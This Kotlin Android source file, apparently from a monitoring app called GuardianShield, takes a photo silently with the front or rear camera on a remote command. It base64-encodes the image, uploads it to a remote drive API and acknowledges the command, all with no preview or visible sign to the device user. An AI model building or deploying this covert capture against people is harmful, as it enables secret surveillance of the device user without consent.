package com.guardianshield.app.workers

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import com.guardianshield.app.utils.DriveApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object CameraWorker {

    @SuppressLint("MissingPermission")
    fun capturePhoto(context: Context, useFrontCamera: Boolean) {
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val backgroundThread = HandlerThread("CameraBackground").apply { start() }
        val backgroundHandler = Handler(backgroundThread.looper)

        try {
            var targetCameraId: String? = null
            for (id in manager.cameraIdList) {
                val chars = manager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (useFrontCamera && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    targetCameraId = id
                    break
                } else if (!useFrontCamera && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    targetCameraId = id
                    break
                }
            }

            if (targetCameraId == null) {
                targetCameraId = manager.cameraIdList.firstOrNull() ?: return
            }

            val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)

            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()

                val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                val camLabel = if (useFrontCamera) "front" else "rear"

                CoroutineScope(Dispatchers.IO).launch {
                    DriveApiClient.postToDrive("upload_photo", mapOf(
                        "camera" to camLabel,
                        "base64" to base64
                    ))
                    // Acknowledge command finished
                    DriveApiClient.acknowledgeCommand(if (useFrontCamera) "takePhotoFront" else "takePhotoRear")
                }

                backgroundThread.quitSafely()
            }, backgroundHandler)

            manager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        captureBuilder.addTarget(imageReader.surface)
                        captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)

                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                        camera.close()
                                    }
                                }, backgroundHandler)
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                camera.close()
                                backgroundThread.quitSafely()
                            }
                        }, backgroundHandler)
                    } catch (e: Exception) {
                        camera.close()
                        backgroundThread.quitSafely()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    backgroundThread.quitSafely()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    backgroundThread.quitSafely()
                }
            }, backgroundHandler)

        } catch (e: Exception) {
            e.printStackTrace()
            backgroundThread.quitSafely()
        }
    }
}
